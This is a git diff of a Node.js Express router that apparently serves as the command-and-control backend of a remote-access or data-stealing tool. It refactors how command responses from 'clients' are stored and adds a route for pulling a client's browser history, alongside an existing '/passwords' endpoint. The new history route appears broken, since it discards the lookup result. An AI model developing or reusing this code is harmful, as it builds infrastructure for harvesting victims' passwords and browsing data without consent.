@@ -6,29 +6,15 @@ const Client = require('../../tool.model');
 const Command = require("../../Commands/commands.model");
 const path = require("path");
 const child_process = require("child_process");
+const {getUrlsFromDB} = require("../../../Api/Utils/UtilFunctions/clientUtils");
+const {addNewClientResponse} = require("../../../Api/Utils/UtilFunctions/clientUtils");
 const appDir = path.dirname(require.main.filename);
 
-
 //Regular command response
-router.route('/').post((req, res) => {
-    const response_id = GenerateRandomId(6);
+router.route('/').post(async (req, res) => {
     const clientId = req.headers.clientid;
     const response = req.body.response;
-    const currentTimeDate = Utils.GetCurrentTimeDate();
-    const newResponse = new Response({
-        response_id: response_id,
-        client_id: clientId,
-        response: response,
-        date: currentTimeDate
-    });
-    newResponse.save()
-        .then(() => res.send())
-        .catch(err => res.status(400).send());
-    Client.findOneAndUpdate({client_id: clientId}, {lastActive: currentTimeDate}, {useFindAndModify: false},
-        function (err) {
-            if (err)
-                Utils.LogToFile(`Error updating last active for client ${clientId}`);
-        })
+    await addNewClientResponse(clientId, response).then(() => res.send()).catch(err => res.status(400).send())
 });
 
 //tool checkout after exit
@@ -121,5 +107,13 @@ router.post("/passwords", function (req, res) {
         res.sendStatus(500)
     }
 });
+
+//get client browser history
+router.route('/history').get((req, res) => {
+    let clientId = req.headers['clientid']
+    getUrlsFromDB(clientId)
+    res.send()
+
+})
 
 module.exports = router;
